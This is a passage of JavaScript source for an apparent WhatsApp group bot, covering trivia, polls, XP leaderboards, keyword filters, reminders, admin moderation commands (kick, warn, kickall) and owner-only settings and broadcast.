            return api.sendText(chatId, `⚠️ Trivia active!\n\n❓ *${t.question}*\n\n${t.options.map((o,i)=>`${i+1}. ${o}`).join('\n')}\n\n_Reply .answer <n>_`, qid)
        }
        await api.sendTyping(chatId, 2)
        const tv = await utils.getTriviaQuestion()
        if (!tv) return api.sendText(chatId, `❌ Could not fetch trivia!`, qid)
        state.trivia[chatId] = { ...tv, active: true }
        return api.sendText(chatId,
            `╭─❏ 🧠 ᴛʀɪᴠɪᴀ ❏\n │\n │ ❓ *${tv.question}*\n │\n`+tv.options.map((o,i)=>` │ ${i+1}. ${o}`).join('\n')+`\n │\n │ _Reply .answer <n>_\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}answer`) {
        const tv = state.trivia[chatId]
        if (!tv?.active) return api.sendText(chatId, `❌ No active trivia! Use *.trivia*`, qid)
        const n = parseInt(args[1])-1
        if (isNaN(n)||n<0||n>=tv.options.length) return api.sendText(chatId, `❌ Pick 1–${tv.options.length}`, qid)
        const correct = tv.options[n]===tv.answer
        state.trivia[chatId] = { active: false }
        if (correct) {
            const xp = utils.addXP(state, sender, sender, 15)
            return api.sendText(chatId, `✅ *Correct!* 🎉 @${sender}\n🏆 Answer: *${tv.answer}*\n⚡ +15 XP!${xp.leveled?`\n🎊 *LEVEL UP!* Level ${xp.level}!`:''}`, qid)
        }
        return api.sendText(chatId, `❌ *Wrong!* @${sender}\n💡 Answer: *${tv.answer}*`, qid)
    }
    if (cmd === `${PREFIX}stoptrivia` && isPrivileged) {
        if (!state.trivia[chatId]?.active) return api.sendText(chatId, `❌ No active trivia!`, qid)
        const ans = state.trivia[chatId].answer; state.trivia[chatId] = { active: false }
        return api.sendText(chatId, `🛑 Trivia stopped!\n💡 Answer was: *${ans}*`, qid)
    }

    // ── XP / RANK / LEADERBOARD ───────────────────────────────
    if (cmd === `${PREFIX}rank` || cmd === `${PREFIX}level` || cmd === `${PREFIX}xp`) {
        const target = extractTarget(args[1], quotedParticipant) || sender
        const d = state.xpData?.[target]
        if (!d) return api.sendText(chatId, `❌ @${target} has no XP yet! Chat to earn XP.`, qid)
        const all  = Object.entries(state.xpData||{}).sort((a,b)=>(b[1].level*1000+b[1].xp)-(a[1].level*1000+a[1].xp))
        const rank = all.findIndex(e=>e[0]===target)+1
        return api.sendText(chatId, `╭─❏ 🏅 ʀᴀɴᴋ ❏\n │ @${target}\n │ Level: *${d.level}*\n │ XP: *${d.xp}/${d.level*100}*\n │ Rank: *#${rank}*\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}leaderboard` || cmd === `${PREFIX}lb` || cmd === `${PREFIX}top`) {
        const lb = utils.getLeaderboard(state, 10)
        if (!lb) return api.sendText(chatId, `❌ No XP data yet!`, qid)
        return api.sendText(chatId, `╭─❏ 🏆 ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ ❏\n │\n${lb}\n ╰─────────────────`, qid)
    }

    // ── POLLS ─────────────────────────────────────────────────
    if (cmd === `${PREFIX}poll` && isPrivileged) {
        if (!query||!query.includes('|')) return api.sendText(chatId, `❌ Usage: .poll Question | Opt1 | Opt2`, qid)
        const parts = query.split('|').map(p=>p.trim()).filter(Boolean)
        const question = parts[0], options = parts.slice(1)
        if (options.length<2) return api.sendText(chatId, `❌ Need at least 2 options!`, qid)
        if (options.length>8) return api.sendText(chatId, `❌ Max 8 options!`, qid)
        const emojis = ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣']
        state.polls[chatId] = { question, options, votes:{}, voters:{} }
        return api.sendText(chatId,
            `╭─❏ 📊 ᴘᴏʟʟ ❏\n │ ❓ *${question}*\n │\n`+options.map((o,i)=>` │ ${emojis[i]} ${o}`).join('\n')+`\n │\n │ _Vote: .vote <n>_ | _End: .endpoll_\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}vote`) {
        const poll = state.polls[chatId]
        if (!poll) return api.sendText(chatId, `❌ No active poll!`, qid)
        const n = parseInt(args[1])-1
        if (isNaN(n)||n<0||n>=poll.options.length) return api.sendText(chatId, `❌ Pick 1–${poll.options.length}`, qid)
        if (poll.voters[sender]) return api.sendText(chatId, `⚠️ Already voted: *${poll.options[poll.voters[sender]]}*`, qid)
        poll.voters[sender]=n; poll.votes[n]=(poll.votes[n]||0)+1
        return api.sendText(chatId, `✅ @${sender} voted for *${poll.options[n]}*!`, qid)
    }
    if (cmd === `${PREFIX}pollresult` || cmd === `${PREFIX}pollresults`) {
        const poll = state.polls[chatId]
        if (!poll) return api.sendText(chatId, `❌ No active poll!`, qid)
        const total = Object.values(poll.votes).reduce((a,b)=>a+b,0)
        const emojis = ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣']
        const results = poll.options.map((o,i)=>{
            const v=poll.votes[i]||0, pct=total?Math.round(v/total*100):0
            return ` │ ${emojis[i]} ${o}\n │   ${'█'.repeat(Math.floor(pct/10))}${'░'.repeat(10-Math.floor(pct/10))} ${pct}% (${v})`
        }).join('\n')
        return api.sendText(chatId, `╭─❏ 📊 ᴘᴏʟʟ ʀᴇsᴜʟᴛs ❏\n │ ❓ *${poll.question}*\n │ Total: ${total}\n │\n${results}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}endpoll` && isPrivileged) {
        const poll = state.polls[chatId]
        if (!poll) return api.sendText(chatId, `❌ No active poll!`, qid)
        const total=Object.values(poll.votes).reduce((a,b)=>a+b,0)
        const winIdx=poll.options.reduce((best,_,i)=>(poll.votes[i]||0)>(poll.votes[best]||0)?i:best,0)
        const emojis=['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣']
        const results=poll.options.map((o,i)=>` │ ${emojis[i]} ${o} — ${poll.votes[i]||0} (${total?Math.round((poll.votes[i]||0)/total*100):0}%)`).join('\n')
        state.polls[chatId]=null
        return api.sendText(chatId, `╭─❏ 📊 ᴘᴏʟʟ ᴇɴᴅᴇᴅ ❏\n │ ❓ *${poll.question}*\n │ Total: ${total}\n │\n${results}\n │\n │ 🏆 Winner: *${poll.options[winIdx]}*\n ╰─────────────────`, qid)
    }

    // ── REACTIONS ─────────────────────────────────────────────
    const gifAction = Object.keys(GIF_ACTIONS).find(k=>cmd===`${PREFIX}${k}`)
    if (gifAction) {
        const target = extractTarget(args[1], quotedParticipant)
        await api.sendTyping(chatId, 1)
        const url = await utils.getReactionGif(GIF_ACTIONS[gifAction])
        if (!url) return api.sendText(chatId, `✨ @${sender} ${gifAction}s ${target?'@'+target:'!'}`, qid)
        return api.sendImage(chatId, url, `✨ *@${sender}* ${gifAction}s${target?' *@'+target+'*':''}!`, qid)
    }

    // ── AFK ───────────────────────────────────────────────────
    if (cmd === `${PREFIX}afk`) {
        state.afkUsers[sender] = { reason: query || 'AFK', time: Date.now() }
        return api.sendText(chatId, `💤 @${sender} is now AFK${query?' — '+query:''}`, qid)
    }

    // ── SAVE ─────────────────────────────────────────────────
    if (cmd === `${PREFIX}save`) {
        if (!quotedMsgId) return api.sendText(chatId, `❌ Reply to a message with .save`, qid)
        await api.sendText(sender+'@s.whatsapp.net', `✅ *Saved message!*\n\n📌 ${quotedText || '(media)'}`)
        return api.sendText(chatId, `✅ Saved to your DM!`, qid)
    }

    // ── MENTION / FORWARD ─────────────────────────────────────
    if (cmd === `${PREFIX}mention`) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .mention <number>`, qid)
        return api.sendText(chatId, `📌 Hey @${target}! ${args.slice(2).join(' ')||''}`, qid)
    }

    // ── FILTER (Levanter: autoreply filter per keyword) ───────
    if (cmd === `${PREFIX}filter`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        if (!query || !query.includes('|')) return api.sendText(chatId, `❌ Usage: .filter keyword | response`, qid)
        const [keyword, ...rest] = query.split('|')
        const response = rest.join('|').trim()
        if (!keyword || !response) return api.sendText(chatId, `❌ Need both keyword and response!`, qid)
        if (!state.filters[chatId]) state.filters[chatId] = {}
        state.filters[chatId][keyword.trim().toLowerCase()] = response
        return api.sendText(chatId, `✅ Filter set!\n🔑 Keyword: *${keyword.trim()}*\n💬 Response: _${response}_`, qid)
    }
    if (cmd === `${PREFIX}gfilter`) {
        // Global filter (all chats) — owner only
        if (!isOwner) return api.sendText(chatId, `❌ Owner only!`, qid)
        if (!query || !query.includes('|')) return api.sendText(chatId, `❌ Usage: .gfilter keyword | response`, qid)
        const [keyword, ...rest] = query.split('|')
        const response = rest.join('|').trim()
        if (!state.filters['global']) state.filters['global'] = {}
        state.filters['global'][keyword.trim().toLowerCase()] = response
        return api.sendText(chatId, `✅ Global filter set!\n🔑 *${keyword.trim()}*`, qid)
    }
    if (cmd === `${PREFIX}stop`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        if (!query) return api.sendText(chatId, `❌ Usage: .stop <keyword>`, qid)
        if (state.filters[chatId]) delete state.filters[chatId][query.toLowerCase()]
        return api.sendText(chatId, `✅ Filter *${query}* removed!`, qid)
    }
    if (cmd === `${PREFIX}gstop`) {
        if (!isOwner) return api.sendText(chatId, `❌ Owner only!`, qid)
        if (!query) return api.sendText(chatId, `❌ Usage: .gstop <keyword>`, qid)
        if (state.filters['global']) delete state.filters['global'][query.toLowerCase()]
        return api.sendText(chatId, `✅ Global filter *${query}* removed!`, qid)
    }

    // ── GREETINGS (personal) ──────────────────────────────────
    if (cmd === `${PREFIX}setgreet`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .setgreet <your custom greeting>`, qid)
        state.greetings[sender] = query
        return api.sendText(chatId, `✅ Greeting set!\n_${query}_`, qid)
    }
    if (cmd === `${PREFIX}getgreet`) {
        const g = state.greetings[sender]
        if (!g) return api.sendText(chatId, `❌ No greeting set! Use .setgreet <text>`, qid)
        return api.sendText(chatId, `╭─❏ 👋 ɢʀᴇᴇᴛɪɴɢ ❏\n │ ${g}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}delgreet`) {
        delete state.greetings[sender]
        return api.sendText(chatId, `✅ Greeting deleted!`, qid)
    }

    // ── REMINDER ─────────────────────────────────────────────
    if (cmd === `${PREFIX}reminder`) {
        // .reminder 10m do homework
        if (!query) return api.sendText(chatId, `❌ Usage: .reminder <time> <message>\nExample: .reminder 10m do homework`, qid)
        const match = query.match(/^(\d+)(s|m|h)\s+(.+)$/)
        if (!match) return api.sendText(chatId, `❌ Format: .reminder 10m <message>`, qid)
        const amount = parseInt(match[1])
        const unit   = match[2]
        const rmText = match[3]
        const ms     = unit === 's' ? amount*1000 : unit === 'm' ? amount*60000 : amount*3600000
        if (ms > 24*3600000) return api.sendText(chatId, `❌ Max 24 hours!`, qid)
        await api.sendText(chatId, `✅ Reminder set for *${amount}${unit}*!\n📌 ${rmText}`, qid)
        setTimeout(async () => {
            await api.sendText(chatId, `🔔 *REMINDER* @${sender}\n\n📌 ${rmText}`)
        }, ms)
        return
    }

    // ── GROUP COMMANDS ────────────────────────────────────────
    if (cmd === `${PREFIX}tagall` || cmd === `${PREFIX}tag`) {
        if (!isGroup) return api.sendText(chatId, `❌ Group only!`, qid)
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins/owner only!`, qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info! Check bot admin permissions.`, qid)
        const numbers = getRealNumbers(info.participants)
        if (!numbers.length) return api.sendText(chatId, `❌ Could not get member list!`, qid)
        let chunk = `📢 *${query||'Attention everyone!'}*\n\n`
        for (const num of numbers) {
            chunk += `@${num} `
            if (chunk.length > 3500) { await api.sendText(chatId, chunk, qid); chunk = ''; await sleep(500) }
        }
        if (chunk.trim()) await api.sendText(chatId, chunk, qid)
        return
    }
    if (cmd === `${PREFIX}hidetag`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Group admins only!`, qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const numbers = getRealNumbers(info.participants)
        return api.sendText(chatId, query || numbers.map(n=>`@${n}`).join(' '), qid)
    }
    if (cmd === `${PREFIX}tagadmins` || cmd === `${PREFIX}admins`) {
        if (!isGroup) return
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const adminNums = (info.participants||[]).filter(isAdmin).map(p=>p.realNumber||api.participantToNumber(p)).filter(Boolean)
        if (!adminNums.length) return api.sendText(chatId, `❌ No admins found!`, qid)
        return api.sendText(chatId, `╭─❏ 👑 ᴀᴅᴍɪɴs ❏\n │ ${adminNums.map(n=>`@${n}`).join(' ')}\n │\n │ 📢 ${query||'Attention admins!'}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}kick`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .kick <number> or reply`, qid)
        await api.removeGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ @${target} kicked!`, qid)
    }
    if (cmd === `${PREFIX}add`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        const target = extractTarget(args[1],'')
        if (!target) return api.sendText(chatId, `❌ Usage: .add <number>`, qid)
        await api.addGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ @${target} added!`, qid)
    }
    if (cmd === `${PREFIX}promote`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .promote <number>`, qid)
        await api.promoteGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ @${target} promoted!`, qid)
    }
    if (cmd === `${PREFIX}demote`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .demote <number>`, qid)
        await api.demoteGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ @${target} demoted!`, qid)
    }
    if (cmd === `${PREFIX}mute` || cmd === `${PREFIX}amute`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        state.announce[chatId] = true
        return api.sendText(chatId, `🔇 Group muted! Only admins can send.`, qid)
    }
    if (cmd === `${PREFIX}unmute` || cmd === `${PREFIX}aunmute`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        state.announce[chatId] = false
        return api.sendText(chatId, `🔊 Group unmuted!`, qid)
    }
    if (cmd === `${PREFIX}warn`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .warn <number>`, qid)
        if (!state.warnings) state.warnings = {}
        const key = `${chatId}_${target}`
        state.warnings[key] = (state.warnings[key]||0) + 1
        const count = state.warnings[key]
        if (count >= 3) {
            await api.removeGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
            state.warnings[key] = 0
            return api.sendText(chatId, `🚫 @${target} kicked after 3 warnings!`, qid)
        }
        return api.sendText(chatId, `⚠️ *Warning ${count}/3* for @${target}\n${query||'Follow group rules!'}\n\n_3 warnings = kick_`, qid)
    }
    if (cmd === `${PREFIX}warnings` || cmd === `${PREFIX}checkwarn`) {
        const target = extractTarget(args[1], quotedParticipant)||sender
        const count  = state.warnings?.[`${chatId}_${target}`]||0
        return api.sendText(chatId, `╭─❏ ⚠️ ᴡᴀʀɴɪɴɢs ❏\n │ @${target}: *${count}/3*\n │ ${count>=3?'🚫 Next: kick!':count>=1?'⚡ Be careful!':'✅ Clean'}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}clearwarnings`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .clearwarnings <number>`, qid)
        if (state.warnings) state.warnings[`${chatId}_${target}`] = 0
        return api.sendText(chatId, `✅ Warnings cleared for @${target}`, qid)
    }
    if (cmd === `${PREFIX}del`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        if (!quotedMsgId) return api.sendText(chatId, `❌ Reply to a message with .del`, qid)
        await api.deleteMessage(chatId, quotedMsgId)
        return
    }
    if (cmd === `${PREFIX}gcinfo` || cmd === `${PREFIX}ginfo`) {
        if (!isGroup) return api.sendText(chatId, `❌ Group only!`, qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info! Make sure bot is admin.`, qid)
        const total  = (info.participants||[]).length
        const admins = (info.participants||[]).filter(isAdmin).length
        return api.sendText(chatId,
            `╭─❏ 👥 ɢʀᴏᴜᴘ ɪɴꜰᴏ ❏\n │ 📛 ${info.subject||info.name||chatId}\n │ 🆔 ${chatId}\n │ 👥 Members : ${total}\n │ 👑 Admins  : ${admins}\n │ 🙋 Regular : ${total-admins}\n │ 📅 Created : ${info.creation?new Date(info.creation*1000).toDateString():'Unknown'}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}listadmins`) {
        if (!isGroup) return api.sendText(chatId, `❌ Group only!`, qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const admins = (info.participants||[]).filter(isAdmin)
        if (!admins.length) return api.sendText(chatId, `❌ No admins found!`, qid)
        const nums = admins.map(a=>` │ • @${a.realNumber||api.participantToNumber(a)||(a.id||'').split('@')[0]}`).join('\n')
        return api.sendText(chatId, `╭─❏ 👑 ᴀᴅᴍɪɴs (${admins.length}) ❏\n${nums}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}grouplink` || cmd === `${PREFIX}invite`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        const code = await api.getGroupInviteCode(chatId)
        if (!code) return api.sendText(chatId, `❌ Could not get invite link! Make sure bot is admin.`, qid)
        return api.sendText(chatId, `🔗 *Invite Link*\n\nhttps://chat.whatsapp.com/${code}`, qid)
    }
    if (cmd === `${PREFIX}resetlink` || cmd === `${PREFIX}revoke`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        try {
            const res = await api.request('delete', `/group/revokeInviteCode/${process.env.EVO_INSTANCE||'tavik-bot'}`, { groupJid: chatId })
            const code = res?.inviteCode || res?.code || res?.invite
            if (!code) return api.sendText(chatId, `❌ Failed to reset link!`, qid)
            return api.sendText(chatId, `✅ *New Link*\n\nhttps://chat.whatsapp.com/${code}`, qid)
        } catch { return api.sendText(chatId, `❌ Failed to reset link!`, qid) }
    }
    if (cmd === `${PREFIX}setgcname`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        if (!query) return api.sendText(chatId, `❌ Usage: .setgcname <name>`, qid)
        const res = await api.updateGroupInfo(chatId, { subject: query })
        return api.sendText(chatId, res ? `✅ Group renamed to *${query}*` : `❌ Failed! Make sure bot is admin.`, qid)
    }
    if (cmd === `${PREFIX}pdm`) {
        // Private DM — send private message to all members
        if (!isOwner) return api.sendText(chatId, `❌ Owner only!`, qid)
        if (!query) return api.sendText(chatId, `❌ Usage: .pdm <message>`, qid)
        if (!isGroup) return api.sendText(chatId, `❌ Group only!`, qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const numbers = getRealNumbers(info.participants)
        await api.sendText(chatId, `📨 Sending DM to ${numbers.length} members...`, qid)
        let sent = 0
        for (const num of numbers) {
            try { await api.sendText(`${num}@s.whatsapp.net`, query); sent++; await sleep(500) } catch {}
        }
        return api.sendText(chatId, `✅ DM sent to *${sent}* members!`, qid)
    }
    if (cmd === `${PREFIX}inactive`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const allNums = getRealNumbers(info.participants)
        const active  = Object.keys(state.msgCount[chatId]||{})
        const inactive = allNums.filter(n=>!active.includes(n))
        if (!inactive.length) return api.sendText(chatId, `✅ No inactive members found!`, qid)
        return api.sendText(chatId,
            `╭─❏ 😴 ɪɴᴀᴄᴛɪᴠᴇ (${inactive.length}) ❏\n │ ${inactive.slice(0,20).map(n=>`@${n}`).join('\n │ ')}\n │ ${inactive.length>20?`...and ${inactive.length-20} more`:''}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}msgs`) {
        if (!isGroup) return api.sendText(chatId, `❌ Group only!`, qid)
        const counts = state.msgCount[chatId]||{}
        const sorted = Object.entries(counts).sort((a,b)=>b[1]-a[1]).slice(0,10)
        if (!sorted.length) return api.sendText(chatId, `❌ No message data yet!`, qid)
        return api.sendText(chatId,
            `╭─❏ 💬 ᴍsɢ ᴄᴏᴜɴᴛ ❏\n`+sorted.map((e,i)=>` │ ${i+1}. @${e[0]} — ${e[1]} msgs`).join('\n')+`\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}common`) {
        // Common groups — ask AI since we can't list them
        if (!isGroup) return api.sendText(chatId, `❌ Group only!`, qid)
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .common <number>`, qid)
        return api.sendText(chatId, `ℹ️ Common group detection requires server-side support. @${target} is in this group with you!`, qid)
    }
    if (cmd === `${PREFIX}antifake`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        state.antifake[chatId] = args[1]==='on'
        return api.sendText(chatId, `🛡️ Anti-Fake: *${state.antifake[chatId]?'ON ✅':'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}kickall`) {
        if (!isGroup||!isOwner) return api.sendText(chatId, `❌ Owner only!`, qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const members = (info.participants||[])
            .filter(p => {
                if (isAdmin(p)) return false
                const num = p.realNumber||api.participantToNumber(p)||''
                return !OWNER_NUMBERS.some(o=>num.endsWith(o.replace(/[^0-9]/g,''))||o.replace(/[^0-9]/g,'').endsWith(num))
            })
            .map(p=>(p.id||p.jid||'').includes('@')?p.id||p.jid:`${p.realNumber||api.participantToNumber(p)}@s.whatsapp.net`)
            .filter(Boolean)
        if (!members.length) return api.sendText(chatId, `⚠️ No members to kick!`, qid)
        await api.sendText(chatId, `⚡ Kicking ${members.length}...`, qid)
        for (let i=0;i<members.length;i+=5) { await api.removeGroupParticipants(chatId,members.slice(i,i+5)); await sleep(1000) }
        return api.sendText(chatId, `✅ Kicked ${members.length} members.`, qid)
    }

    // ── SETTINGS ─────────────────────────────────────────────
    if (cmd === `${PREFIX}chatbot`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        const on = args[1]==='on'
        state.chatbot[chatId] = on
        if (state.chatbotRate[chatId]) delete state.chatbotRate[chatId]
        return api.sendText(chatId, `🤖 Chatbot: *${on?'ON ✅ — Replies to every message!':'OFF ❌ — Commands only.'}*`, qid)
    }
    if (cmd === `${PREFIX}autoreply`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoreply[chatId] = args[1]==='on'
        return api.sendText(chatId, `🤖 Auto Reply: *${state.autoreply[chatId]?'ON ✅':'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antilink`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        state.antilink[chatId] = args[1]==='on'
        return api.sendText(chatId, `🔗 Anti Link: *${state.antilink[chatId]?'ON ✅':'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antispam`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        state.antispam[chatId] = args[1]==='on'
        return api.sendText(chatId, `🚫 Anti Spam: *${state.antispam[chatId]?'ON ✅':'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antibadword` || cmd === `${PREFIX}antiword`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        state.antibadword[chatId] = args[1]==='on'
        return api.sendText(chatId, `🤬 Anti Bad Word: *${state.antibadword[chatId]?'ON ✅':'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antidelete`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        if (!state.antiDelete[chatId]) state.antiDelete[chatId] = {}
        state.antiDelete[chatId].enabled = args[1]==='on'
        return api.sendText(chatId, `🗑️ Anti Delete: *${state.antiDelete[chatId].enabled?'ON ✅':'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antighostping` || cmd === `${PREFIX}antighost`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        state.antiGhostPing[chatId] = args[1]==='on'
        return api.sendText(chatId, `👻 Anti Ghost Ping: *${state.antiGhostPing[chatId]?'ON ✅':'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}autoread`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoread = args[1]==='on'
        return api.sendText(chatId, `👁️ Auto Read: *${state.autoread?'ON ✅':'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}autoreact`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoreact = args[1]==='on'
        return api.sendText(chatId, `❤️ Auto React: *${state.autoreact?'ON ✅':'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}autotyping`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autotyping = args[1]==='on'
        return api.sendText(chatId, `⌨️ Auto Typing: *${state.autotyping?'ON ✅':'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}welcome` || cmd === `${PREFIX}setwelcome`) {
        if (!isPrivileged||!isGroup) return api.sendText(chatId, `❌ Admins only!`, qid)
        if (!state.welcome[chatId]) state.welcome[chatId] = { enabled:false, msg:'', byeMsg:'' }
        if (args[1]==='off') { state.welcome[chatId].enabled=false; return api.sendText(chatId, `👋 Welcome: *OFF ❌*`, qid) }
        if (args[1]==='on')  { state.welcome[chatId].enabled=true;  return api.sendText(chatId, `👋 Welcome: *ON ✅*`, qid) }
        if (query) { state.welcome[chatId].msg=query; state.welcome[chatId].enabled=true; return api.sendText(chatId, `✅ Welcome message set!\n_${query}_`, qid) }
        return api.sendText(chatId, `❌ Usage: .welcome on/off  or  .welcome <msg>`, qid)
    }
    if (cmd === `${PREFIX}goodbye` || cmd === `${PREFIX}setgoodbye`) {
        if (!isPrivileged||!isGroup) return api.sendText(chatId, `❌ Admins only!`, qid)
        if (!state.welcome[chatId]) state.welcome[chatId] = { enabled:false, msg:'', byeMsg:'' }
        if (args[1]==='off') { state.welcome[chatId].byeMsg=''; return api.sendText(chatId, `👋 Goodbye: *OFF ❌*`, qid) }
        if (query) { state.welcome[chatId].byeMsg=query; state.welcome[chatId].enabled=true; return api.sendText(chatId, `✅ Goodbye set!\n_${query}_`, qid) }
        return api.sendText(chatId, `❌ Usage: .goodbye <msg>  or  .goodbye off`, qid)
    }
    if (cmd === `${PREFIX}announce`) {
        if (!isGroup||!isPrivileged) return api.sendText(chatId, `❌ Admins only!`, qid)
        state.announce[chatId] = args[1]==='on'
        return api.sendText(chatId, `📢 Announce: *${state.announce[chatId]?'ON ✅ (Admins only)':'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}self` && isOwner) { state.selfMode=true; return api.sendText(chatId, `🔒 *Self Mode ON*`, qid) }
    if (cmd === `${PREFIX}public` && isOwner) { state.selfMode=false; return api.sendText(chatId, `🔓 *Public Mode ON*`, qid) }

    // ── SUDO ──────────────────────────────────────────────────
    if (cmd === `${PREFIX}addsudo` && isOwner) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .addsudo <number>`, qid)
        if (!state.sudoUsers.includes(target)) state.sudoUsers.push(target)
        return api.sendText(chatId, `✅ @${target} added to sudo!`, qid)
    }
    if (cmd === `${PREFIX}delsudo` && isOwner) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .delsudo <number>`, qid)
        state.sudoUsers = state.sudoUsers.filter(u=>u!==target)
        return api.sendText(chatId, `✅ @${target} removed from sudo!`, qid)
    }
    if (cmd === `${PREFIX}sudolist` && isOwner) {
        if (!state.sudoUsers.length) return api.sendText(chatId, `╭─❏ 🛡️ sᴜᴅᴏ ❏\n │ No sudo users.\n ╰─────────────────`, qid)
        return api.sendText(chatId, `╭─❏ 🛡️ sᴜᴅᴏ ❏\n`+state.sudoUsers.map((u,i)=>` │ ${i+1}. @${u}`).join('\n')+`\n ╰─────────────────`, qid)
    }

    // ── OWNER COMMANDS ────────────────────────────────────────
    if (cmd === `${PREFIX}broadcast` || cmd === `${PREFIX}bc`) {
        if (!isOwner) return api.sendText(chatId, `❌ Owner only!`, qid)
        if (!query) return api.sendText(chatId, `❌ Usage: .broadcast <message>`, qid)
        await api.sendText(chatId, `📢 Broadcasting...`, qid)
        let sent=0
        try {
            const res = await api.request('get', `/group/fetchAllGroups/${process.env.EVO_INSTANCE||'tavik-bot'}`)
            const groups = Array.isArray(res)?res:(res?.groups||[])
